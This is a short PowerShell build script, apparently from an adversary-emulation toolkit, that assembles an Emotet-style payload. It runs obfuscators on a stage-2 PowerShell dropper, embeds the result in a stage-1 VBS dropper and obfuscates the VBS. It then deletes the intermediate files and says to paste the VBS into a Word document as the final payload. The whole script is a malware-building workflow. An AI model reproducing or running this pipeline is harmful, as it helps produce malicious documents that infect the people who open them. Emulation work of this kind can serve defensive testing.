# should support both interactive an automated modes
# automated should just call the obfuscator scripts
# interactive should prompt the user to enter their options

Write-Host "[i] Obfuscating drop_emotet_stage2.ps1"
python obfuscators\obfuscate_stage2_dropper.py -c conf\drop_emotet_config.yaml -i drop_emotet_stage2.ps1 -o encoded_emotet_stage2_dropper.ps1

Write-Host "[i] Inserting encoded_emotet_stage2_dropper.ps1 into drop_emotet_stage1.vbs"
python obfuscators\obfuscate_stage1_dropper.py -c conf\drop_emotet_config.yaml -i encoded_emotet_stage2_dropper.ps1 -j drop_emotet_stage1.vbs -o tmp.vbs


Write-Host "[i] Obfuscating final VBS payload"
cscript.exe obfuscators\obfuscate_vbs.vbs tmp.vbs

# cleanup
Write-Host "[i] Cleaning up artifacts"
Remove-Item encoded_emotet_stage2_dropper.ps1 
Remove-Item tmp.vbs

Write-Host "[!] Copy the obfuscated VBS script into a word document to make the final payload"